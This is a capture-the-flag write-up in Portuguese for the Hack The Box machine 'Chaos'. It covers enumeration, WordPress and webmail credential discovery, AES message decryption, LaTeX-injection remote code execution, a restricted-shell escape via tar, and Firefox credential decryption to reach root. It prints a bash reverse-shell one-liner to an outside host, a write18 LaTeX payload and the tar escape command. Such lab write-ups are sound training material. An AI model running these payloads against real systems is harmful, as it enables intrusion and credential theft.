![1](https://i.imgur.com/AE94mPY.png)


Antes de iniciar a solucão, adicionei as seguintes alteracões ao **/etc/hosts**:


![2](https://i.imgur.com/xdDvqbb.png)


---
# Enumeracão
Iniciando com o nmap, e possivel visualizar alguns servicos e portas:


`nmap -sV -Pn 10.10.10.120`


![3](https://i.imgur.com/ZL1o8nA.png)


Nos temos http na porta 80 , servicos relacionados a email (imap, pop3) em execucão nas portas 110, 143, 993 e 995.
Comecando pelo http:


![4](https://i.imgur.com/UbjMbRR.png)


Apos uns minutos revirando, não encontrei nenhuma informacão util e segui.
Utilizando o gobuster em **chaos.htb** recebemos:


```
Gobuster v2.0.0              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://chaos.htb/
[+] Threads      : 10
[+] Wordlist     : /usr/share/wordlists/dirb/common.txt
[+] Status codes : 200,204,301,302,307,403
[+] Timeout      : 10s
=====================================================
2019/05/24 14:36:56 Starting gobuster
=====================================================
/.hta (Status: 403)
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/css (Status: 301)
/img (Status: 301)
/index.html (Status: 200)
/javascript (Status: 301)
/js (Status: 301)
/server-status (Status: 403)
/source (Status: 301)
=====================================================
2019/05/24 14:40:36 Finished
=====================================================

```  
Porem, quando utilizado o gobuster diretamente em **10.10.10.120**, o resultado foi:  
```
=====================================================
Gobuster v2.0.0              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.10.120/
[+] Threads      : 10
[+] Wordlist     : /usr/share/wordlists/dirb/common.txt
[+] Status codes : 200,204,301,302,307,403
[+] Timeout      : 10s
=====================================================
2019/05/24 14:41:52 Starting gobuster
=====================================================
/.hta (Status: 403)
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/index.html (Status: 200)
/javascript (Status: 301)
/server-status (Status: 403)
/wp (Status: 301)
=====================================================
2019/05/24 14:45:37 Finished
=====================================================
```  


O que e, no minimo, curioso.
Checando o diretorio **/wp**, qual foi obtido no scan diretamente no ip, podemos visualizar a seguinte saida:


![5](https://i.imgur.com/C6d5YE3.png)


acessando **/wp/wordpress**, obtemos uma pagina. Acessando a area de **posts**, no canto direito do menu, obtemos uma pagina com um campo **"password"**, e logo acima a mensagem **"OCTOBER 20, 2018 BY HUMAN"**.
Utilizando **"human"** como password, obtemos a seguinte saida:


![6](https://i.imgur.com/oQ1xCgM.png)


## O servico de e-mail


Nesse momento, baseado nos resultados de e-mail do nmap, resolvi adicionar a seguinte mudanca ao **/etc/hosts**:


![7](https://i.imgur.com/g1XGpDy.png)


e, acessando **webmail.chaos.htb**:


![8](https://i.imgur.com/jGKkPgS.png)


Utilizando as credenciais obtidas no setor wordpress e acessando os rascunhos:


![9](https://i.imgur.com/clzfG56.png)


Baixando os arquivos anexados, obtemos uma mensagem criptografada e um script python.


```
def encrypt(key, filename):
    chunksize = 64*1024
    outputFile = "en" + filename
    filesize = str(os.path.getsize(filename)).zfill(16)
    IV =Random.new().read(16)  
    encryptor = AES.new(key, AES.MODE_CBC, IV)  
    with open(filename, 'rb') as infile:
        with open(outputFile, 'wb') as outfile:
            outfile.write(filesize.encode('utf-8'))
            outfile.write(IV)  
            while True:
                chunk = infile.read(chunksize)  
                if len(chunk) == 0:
                    break
                elif len(chunk) % 16 != 0:
                    chunk += b' ' * (16 - (len(chunk) % 16))  
                outfile.write(encryptor.encrypt(chunk))
def getKey(password):
            hasher = SHA256.new(password.encode('utf-8'))
            return hasher.digest()
```
O script usa criptografia AES para fazer a codificacão, logo, precisamos de uma funcão que faca o processo contrario.  
```
from Crypto.Hash import SHA256
from Crypto.Cipher import AES  
def getKey(password):
            hasher = SHA256.new(password.encode('utf-8'))
            return hasher.digest()  
def decode(key, filename):
    fileoutput = filename + "_out"
    csize = 64*1024  
    with open(filename, 'rb') as file:
        size = int(file.read(16))
        value = file.read(16)
        decrypt = AES.new(key, AES.MODE_CBC, value)
        with open(fileoutput, 'wb') as outfile:
            while True:
                chunk = file.read(csize)
                if len(chunk) == 0:
                    break
                outfile.write(decrypt.decrypt(chunk))
            outfile.truncate(size)  
password = input("Senha: ")
decode(getKey(password), 'enim_msg.txt')
```  


No email, a dica era:  


```
"Hii, sahay
Check the enmsg.txt
You are the password XD."
```

Então, usamos nosso nome **"sahay"** como senha.
A saida:


![10](https://i.imgur.com/CE5E6WI.png)


## Exploracão e obtencão de shell


Acessando `http://chaos.htb/J00_w1ll_f1Nd_n07H1n9_H3r3`, temos:


![11](https://i.imgur.com/WEBJxLo.png   )


Utilizando um proxy e checando a saida desta requisicão, vemos:


![12](https://i.imgur.com/Fcrff2p.png)


* e Possivel vermos [pdfTeX](https://en.wikipedia.org/wiki/PdfTeX) no corpo da resposta


Abusando do LaTeX injection, podemos obter uma possivel execucão de codigo remoto.
A estrutura do payload: `\immediate\write18{env > output}` ou `\input{output}`. Outros exemplos podem ser encontrados em [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LaTeX%20Injection).


Enviando uma requisicão de shell reversa, temos a saida:


payload: `bash -c 'bash -i >& /dev/tcp/10.0.0.1/8080 0>&1'` [ encoded as url ]


![13](https://i.imgur.com/d5LK9SK.png)


## Escalada de privilegios 1/2


Apos usar o python pty, podemos utilizar do usuario `ayush:jiujitsu` que conseguimos anteriormente.


![14](https://i.imgur.com/aUAue6V.png)


Conseguimos o acesso, porem, com uma shell restrita.
Podemos visualizar os binarios quais podemos executar, exibindo o PATH e utilizando da tecla **tab**.


![15](https://i.imgur.com/4mogxmH.png)


* tar
* ping
* dir


---


Utilizando do Tar para o retorno da shell com:


```
tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```
e concertando o PATH com:


`export PATH=/bin`


ou


```
export PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```
![16](https://i.imgur.com/NfkSUNa.png)


## Escalada de privilegios 2/2


Listando os diretorios e arquivos ocultos, temos:


![17](https://i.imgur.com/RWUW40l.png)


Com o diretorio **.mozila** disponivel, podemos traze-lo para nosso ambiente local utilizando:


`python -m SimpleHTTPServer port`


E baixando localmente em nossa maquina, com:

`http://chaos.htb:1919/ --recursive`


![18](https://i.imgur.com/ZOlilEG.png   )


apos o download, vemos que existe um arquivo chamado **bzo7sjt1.default** dentre varios outros. E, utilizando da ferramenta [Firefox_decrypt](https://github.com/unode/firefox_decrypt/blob/master/firefox_decrypt.py), podemos fazer a decodificacão do nosso arquivo *.default. Logo apos o download e execucão da ferramenta, ele nos solicita uma Senha.
Utilizando da senha `jiujitsu` do usuario `ayush` que conseguimos previamente, obtemos a saida do arquivo criptografado:


![19](https://i.imgur.com/6BIME4P.png)


Voltando a nossa shell, utilizamos as credenciais para o *root* e obtemos a flag final:


![20](https://i.imgur.com/9zzP3qI.png)


---
### Referencias


* [GTFoBins](https://gtfobins.github.io/)
* [Pentestmonkey](http://pentestmonkey.net/)
* [Linux Restricted Shell Bypass](https://www.exploit-db.com/docs/english/44592-linux-restricted-shell-bypass-guide.pdf)  